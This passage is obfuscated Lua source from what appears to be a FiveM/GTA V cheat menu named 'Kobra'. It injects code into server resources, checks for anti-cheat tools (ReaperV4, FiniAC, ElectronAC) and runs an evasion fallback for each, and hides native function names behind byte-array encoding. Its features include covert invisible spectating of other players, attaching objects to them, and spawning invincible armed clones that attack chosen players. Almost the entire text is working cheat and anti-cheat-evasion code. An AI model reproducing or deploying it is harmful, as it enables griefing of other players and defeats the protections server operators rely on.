                    attempts = attempts + 1
                end
                if attempts >= 20 then return end
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]],v212,v330));v213=v213 + 1 ;break;end end end end v209:Notify("success","Kobra",string.format("Object '%s' spawned on %d/%d player(s)!",v211,v213, #v210),5000);end;v12.HandleSpectateToggle=function(v214,v215,v216) local v217=0;local v218;local v219;while true do if (v217==(0 -0)) then if  not v215 then local v760=0 -0 ;while true do if (v760==(0 -0)) then v214:Notify("error","Kobra","Invalid player ID provided!",609 + 2391 );return;end end end v218=tonumber(v215);v217=1974 -(1656 + 317) ;end if (v217==(3 + 0)) then if v219 then print("Spectate Fallback #3 (ReaperV4 detected, running direct)");if  not GetPlayerName(GetPlayerFromServerId(v218)) then local v932=0 + 0 ;while true do if (v932==(2 -1)) then return;end if (v932==(0 -0)) then v214:Notify("error","Kobra","Target player not found!",3354 -(5 + 349) );print("[ReaperV4 Spectate] Error: No player found for server ID:",v218);v932=4 -3 ;end end end local v761=string.format([[
            local function HookNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    print("[ReaperV4 Spectate] Warning: Native " .. nativeName .. " not found or not a function")
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                if not f then print("[ReaperV4 Spectate] Error: Global function " .. k .. " not found") end
                return f
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            local function _t()
                local createThread = _G[_d(_b("CreateThread"))]
                if not createThread then print("[ReaperV4 Spectate] Error: CreateThread not found") end
                return createThread
            end
            HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
            HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
            HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            local function findClientIdByServerId(sid)
                local players = _g(_b("GetActivePlayers"))()
                if not players then
                    print("[ReaperV4 Spectate] Error: GetActivePlayers returned nil")
                    return -1
                end
                print("[ReaperV4 Spectate] Active players:", table.concat(players, ", "))
                for _, pid in ipairs(players) do
                    local serverId = _g(_b("GetPlayerServerId"))(pid)
                    print("[ReaperV4 Spectate] Player Client ID:", pid, "Server ID:", serverId)
                    if serverId == sid then
                        print("[ReaperV4 Spectate] Found client ID:", pid, "for server ID:", sid)
                        return pid
                    end
                end
                print("[ReaperV4 Spectate] Error: No client ID found for server ID:", sid)
                return -1
            end
            local function stopSpectate()
                if not _G.osintSpectate or not _G.osintSpectate.enabled then
                    print("[ReaperV4 Spectate] StopSpectate: Not currently spectating")
                    return
                end
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local back = _G.osintSpectate.back
                local heading = _G.osintSpectate.heading
                local wasVisible = _G.osintSpectate.wasVisible
                if back then
                    _g(_b("RequestCollisionAtCoord"))(back.x, back.y, back.z)
                end
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                end
                _g(_b("FreezeEntityPosition"))(me, false)
                if back then
                    _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true)
                end
                if heading then
                    _g(_b("SetEntityHeading"))(me, heading)
                end
                _g(_b("SetEntityCollision"))(me, true, true)
                _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                _g(_b("SetEntityInvincible"))(me, false)
                _G.osintSpectate.enabled = false
                _G.osintSpectate.targetSid = nil
                print("[ReaperV4 Spectate] Stopped spectating")
            end
            local function startSpectate(targetSid)
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local myCoords = _g(_b("GetEntityCoords"))(me)
                if not myCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil")
                    return
                end
                local myHeading = _g(_b("GetEntityHeading"))(me)
                if not _G.osintSpectate then _G.osintSpectate = {} end
                _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                _G.osintSpectate.heading = myHeading
                _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                _G.osintSpectate.enabled = true
                _G.osintSpectate.targetSid = targetSid
                local clientId = findClientIdByServerId(targetSid)
                local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                if clientId == -1 or targetPed == 0 then
                    print("[ReaperV4 Spectate] Error: Invalid client ID or target ped not found for server ID:", targetSid)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Target player not found!", 3000)
                    return
                end
                local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                if not tCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords for target ped returned nil")
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Failed to get target position!", 3000)
                    return
                end
                _g(_b("RequestCollisionAtCoord"))(tCoords.x, tCoords.y, tCoords.z)
                _g(_b("SetEntityVisible"))(me, false, false)
                _g(_b("SetEntityCollision"))(me, false, false)
                _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                _g(_b("SetEntityInvincible"))(me, true)
                local zOffset = 15.0 -- Default offset since GetGroundZFor_3dCoord is unavailable
                _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z + zOffset, false, false, false, true)
                _w(300)
                _g(_b("FreezeEntityPosition"))(me, true)
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Spectator mode not supported!", 3000)
                    return
                end
                print("[ReaperV4 Spectate] Started spectating server ID:", targetSid, "on ped:", targetPed)
                _t()(function()
                    while _G.osintSpectate and _G.osintSpectate.enabled do
                        local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                        if cid == -1 then
                            print("[ReaperV4 Spectate] Error: Client ID not found in loop for server ID:", targetSid)
                            break
                        end
                        local ped = _g(_b("GetPlayerPed"))(cid)
                        if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then
                            print("[ReaperV4 Spectate] Error: Target ped not found or does not exist")
                            break
                        end
                        local pc = _g(_b("GetEntityCoords"))(ped)
                        if not pc then
                            print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil in loop")
                            break
                        end
                        _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z + zOffset, false, false, false, true)
                        _w(400)
                    end
                    stopSpectate()
                end)
            end
            local enable = %s
            local sid = %d
            if enable then
                print("[ReaperV4 Spectate] Starting spectate for server ID:", sid)
                startSpectate(sid)
            else
                print("[ReaperV4 Spectate] Stopping spectate")
                stopSpectate()
            end
        ]],tostring(v216),v218);local v762,v763=load(v761);if v762 then local v933=0;local v934;local v935;while true do if (v933==(1271 -(266 + 1005))) then v934,v935=pcall(v762);if  not v934 then local v1209=0 + 0 ;while true do if (v1209==(0 -0)) then print("[ReaperV4 Spectate] Execution error:",v935);v214:Notify("error","Kobra","Failed to execute spectate code!",3000);break;end end else print("[ReaperV4 Spectate] Code executed successfully");end break;end end else local v936=0 -0 ;while true do if ((1696 -(561 + 1135))==v936) then print("[ReaperV4 Spectate] Load error:",v763);v214:Notify("error","Kobra","Failed to load spectate code!",3909 -909 );break;end end end elseif ((GetResourceState("FiniAC")=="started") or (GetResourceState("ElectronAC")=="started")) then print("Spectate Fallback #1");MachoInjectResourceRaw("any",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                HookNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                local function Clamp(val, min, max)
                    if val < min then return min end
                    if val > max then return max end
                    return val
                end
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if _G.osintSpectate.camera then
                        _g(_b("RenderScriptCams"))(false, false, 0, true, true)
                        _g(_b("DestroyCam"))(_G.osintSpectate.camera, false)
                        _G.osintSpectate.camera = nil
                    end
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then
                        local valid, groundZ = _g(_b("GetGroundZFor_3dCoord"))(back.x, back.y, back.z, false)
                        local targetCoords = valid and vector3(back.x, back.y, groundZ + 1.0) or back
                        _g(_b("SetEntityCoords"))(me, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                    end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                    _g(_b("SetFocusEntity"))(me)
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local zOffset = 3.0
                    local cam = _g(_b("CreateCam"))("DEFAULT_SCRIPTED_CAMERA", true)
                    _G.osintSpectate.camera = cam
                    _g(_b("SetCamCoord"))(cam, tCoords.x, tCoords.y, tCoords.z + zOffset)
                    _g(_b("SetCamRot"))(cam, -30.0, 0.0, _g(_b("GetEntityHeading"))(targetPed), 2)
                    _g(_b("RenderScriptCams"))(true, false, 0, true, true)
                    _t()(function()
                        local cameraReady = false
                        _w(550)
                        cameraReady = true
                        while _G.osintSpectate and _G.osintSpectate.enabled and cameraReady do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            _g(_b("SetCamCoord"))(cam, pc.x, pc.y, pc.z + zOffset)
                            local camRot = _g(_b("GetCamRot"))(cam, 2)
                            local x = _g(_b("GetDisabledControlNormal"))(0, 1)
                            local y = _g(_b("GetDisabledControlNormal"))(0, 2)
                            local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                            local newYaw = camRot.z - x * 5
                            _g(_b("SetCamRot"))(cam, newPitch, camRot.y, newYaw, 2)
                            _g(_b("SetFocusPosAndVel"))(pc.x, pc.y, pc.z, 0.0, 0.0, 0.0)
                            _w(0)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v216),v218));else local v937=0 -0 ;while true do if (0==v937) then print("Spectate Fallback #2");MachoInjectResourceRaw("monitor",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true) end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local groundZ = tCoords.z
                    local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(tCoords.x, tCoords.y, tCoords.z, false)
                    if foundGround then
                        groundZ = zPos
                    end
                    local zOffset = math.max(15.0, tCoords.z - groundZ + 5.0)
                    _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z - zOffset, false, false, false, true)
                    _w(300)
                    _g(_b("FreezeEntityPosition"))(me, true)
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                    _t()(function()
                        while _G.osintSpectate and _G.osintSpectate.enabled do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            local groundZ = pc.z
                            local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(pc.x, pc.y, pc.z, false)
                            if foundGround then
                                groundZ = zPos
                            end
                            local zOffset = math.max(15.0, pc.z - groundZ + 5.0)
                            _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z - zOffset, false, false, false, true)
                            _w(400)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v216),v218));break;end end end break;end if (v217==(1067 -(507 + 559))) then if  not v218 then v214:Notify("error","Kobra","Invalid server ID format!",3000);return;end if (v218==tonumber(GetPlayerServerId(PlayerId()))) then v214:Notify("error","Kobra","You cannot spectate yourself!",3000);return;end v217=4 -2 ;end if ((6 -4)==v217) then if v216 then v214:Notify("success","Kobra",("You have started spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v218)) or "Unknown" ,v218),3000);else v214:Notify("error","Kobra",("You have stopped spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v218)) or "Unknown" ,v218),3388 -(212 + 176) );end v219=GetResourceState("ReaperV4")=="started" ;v217=908 -(250 + 655) ;end end end;local v74={"envi-medic","envi-hud","envi-yoga","envi-chopshop","envi-chopshop-v2","envi-foodtrucks","envi-dumpsters","envi-prescriptions","envi-druglabs","lation_laundering"};local function v75() for v331,v332 in ipairs(v74) do if (GetResourceState(v332)=="started") then return v332;end end return nil;end local v76=nil;if ((GetResourceState("es_extended")=="started") and (GetResourceState("timeless-emotes")=="started")) then v76="es_extended";elseif ((GetResourceState("core")=="started") and (GetResourceState("timeless-emotes")=="started")) then v76="core";end v12.EnableInvisibility=function(v220) local function v221(v333,v334) local v335=_G[v333];if ( not v335 or (type(v335)~="function")) then return;end _G[v333]=function(...) return v334(v335,...);end;end v221("CreateThread",function(v336,...) return v336(...);end);v221("PlayerPedId",function(v337,...) return v337(...);end);v221("IsEntityVisible",function(v338,...) return true;end);v221("IsEntityVisibleToScript",function(v339,...) return true;end);v221("SetEntityVisible",function(v340,v341,v342,v343) local v344=0 -0 ;while true do if (v344==0) then if (_G.osintInvisibility and _G.osintInvisibility.enabled) then return v340(v341,false,v343);end return v340(v341,v342,v343);end end end);if  not _G.osintInvisibility then _G.osintInvisibility={enabled=false,wasVisible=true};end if  not _G.osintInvisibility.enabled then _G.osintInvisibility.enabled=true;local v534=PlayerPedId();_G.osintInvisibility.wasVisible=IsEntityVisible(v534);SetEntityVisible(v534,false,false);CreateThread(function() while _G.osintInvisibility and _G.osintInvisibility.enabled  do local v678=0 -0 ;local v679;while true do if (v678==(773 -(48 + 725))) then v679=PlayerPedId();if (v679 and DoesEntityExist(v679)) then SetEntityVisible(v679,false,false);end v678=1;end if (v678==(1 -0)) then Wait(1341 -841 );break;end end end end);end end;v12.DisableInvisibility=function(v222) if (_G.osintInvisibility and _G.osintInvisibility.enabled) then _G.osintInvisibility.enabled=false;local v535=PlayerPedId();if (v535 and DoesEntityExist(v535)) then SetEntityVisible(v535,_G.osintInvisibility.wasVisible,false);end end end;v12.HandleAttackClonePlayer=function(v223,v224) local v225=0 + 0 ;local v226;while true do if (2==v225) then MachoInjectResourceRaw("monitor",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local function copyPedAppearance(sourcePed, targetPed)
            for i = 0, 11 do
                local drawable = g({71,101,116,80,101,100,68,114,97,119,97,98,108,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                local texture = g({71,101,116,80,101,100,84,101,120,116,117,114,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                g({83,101,116,80,101,100,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})(targetPed, i, drawable, texture, 2)
            end
            for i = 0, 7 do
                local propIndex = g({71,101,116,80,101,100,80,114,111,112,73,110,100,101,120})(sourcePed, i)
                local propTexture = g({71,101,116,80,101,100,80,114,111,112,84,101,120,116,117,114,101,73,110,100,101,120})(sourcePed, i)
                if propIndex ~= -1 then
                    g({83,101,116,80,101,100,80,114,111,112})(targetPed, i, propIndex, propTexture)
                else
                    g({67,108,101,97,114,80,101,100,80,114,111,112})(targetPed, i)
                end
            end
            local headBlendData = {g({71,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(sourcePed)}
            if headBlendData[1] then
                g({83,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(
                    targetPed,
                    headBlendData[2], -- shapeFirst
                    headBlendData[3], -- shapeSecond
                    headBlendData[4], -- shapeThird
                    headBlendData[5], -- skinFirst
                    headBlendData[6], -- skinSecond
                    headBlendData[7], -- skinThird
                    headBlendData[8], -- shapeMix
                    headBlendData[9], -- skinMix
                    headBlendData[10] -- thirdMix
                )
            end
        end
        local function clonePed(ped)
            local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
            local heading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped)
            local modelHash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
            g({82,101,113,117,101,115,116,77,111,100,101,108})(modelHash)
            local timeout = 0
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) and timeout < 500 do
                wait(10)
                timeout = timeout + 1
            end
            if not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) then return end
            -- Spawn ped 2 units away from player
            local spawnRadius = 2.0
            local spawnX = coords.x + (math.random() * 2 - 1) * spawnRadius
            local spawnY = coords.y + (math.random() * 2 - 1) * spawnRadius
            local spawnZ = coords.z
            local clone = g({67,114,101,97,116,101,80,101,100})(4, modelHash, spawnX, spawnY, spawnZ, heading, true, true)
            if clone and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(clone) then
                copyPedAppearance(ped, clone)
                g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(clone, true, true)
                g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelHash)
                local cloneGroup = g({65,100,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112})("HOSTILE_CLONE_" .. tostring(clone))
                g({83,101,116,80,101,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112,72,97,115,104})(clone, cloneGroup)
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, cloneGroup, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"))
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"), cloneGroup)
                
                local weaponHash = g({71,101,116,72,97,115,104,75,101,121})(decode({87,69,65,80,79,78,95,83,84,85,78,71,85,78}))
                g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(clone, weaponHash, 1000, false, true)
                local weaponEntity = g({71,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110,69,110,116,105,116,121,73,110,100,101,120})(clone)
                if weaponEntity and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(weaponEntity) then
                    g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(weaponEntity, true, true)
                end
                g({83,101,116,80,101,100,68,114,111,112,115,87,101,97,112,111,110,115,87,104,101,110,68,101,97,100})(clone, false)
                g({83,101,116,80,101,100,67,97,110,83,119,105,116,99,104,87,101,97,112,111,110})(clone, false)
                g({84,97,115,107,67,111,109,98,97,116,80,101,100})(clone, ped, 0, 16)
                g({83,101,116,80,101,100,67,111,109,98,97,116,65,116,116,114,105,98,117,116,101,115})(clone, 0, true) -- Always aggressive
                g({83,101,116,80,101,100,70,108,101,101,65,116,116,114,105,98,117,116,101,115})(clone, 0, false) -- Prevent fleeing
                g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(clone, true)
                g({83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108})(clone, false)
            end
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
